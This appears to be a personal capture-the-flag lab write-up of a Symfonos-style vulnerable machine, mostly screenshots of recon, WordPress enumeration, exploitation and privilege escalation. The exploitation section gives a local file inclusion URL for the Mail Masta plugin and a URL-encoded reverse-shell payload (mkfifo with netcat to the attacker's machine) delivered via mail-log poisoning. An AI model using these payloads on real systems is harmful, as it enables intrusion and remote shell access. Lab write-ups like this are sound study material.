---
date: 2026-04-06
IP: 192.168.0.39
Difficulty: Easy/Medium
Done: true
---
# Recon

## Nmap

![[Pasted image 20260406114248.png]]

![[Pasted image 20260406114408.png]]
## GoBuster

![[Pasted image 20260406114347.png]]

## Nikto

![[Pasted image 20260406115035.png]]
# Analysis

![[Pasted image 20260406114820.png]]

![[Pasted image 20260406114749.png]]

![[Pasted image 20260406115455.png]]

> [!bug] I was wrong inserting the password (can happen lol)

![[Pasted image 20260406115606.png]]

![[Pasted image 20260406115804.png]]

![[Pasted image 20260406115821.png]]
## SMTP

![[Pasted image 20260406115236.png]]

## WP

![[Pasted image 20260406120601.png]]

![[Pasted image 20260406120022.png]]

![[Pasted image 20260406120252.png]]


> [!bug] Bruteforcing was unsuccessfull

![[Pasted image 20260406122024.png]]

![[Pasted image 20260406122012.png]]
# Exploitation

## LFI + Log Poisoning

`http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

![[Pasted image 20260406174035.png]]

![[Pasted image 20260406173840.png]]

> [!bug] We can use this to connect to our attacking machine
> 
> `http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2%3E%261|nc+192.168.0.35+1234+%3E/tmp/f`

![[Pasted image 20260406173927.png]]

## MySql

![[Pasted image 20260406174914.png]]


> [!bug] Just useless

## Privilege Escalation

![[Pasted image 20260406175743.png]]

## PATH hijacking

![[Pasted image 20260406175803.png]]

![[Pasted image 20260406175819.png]]
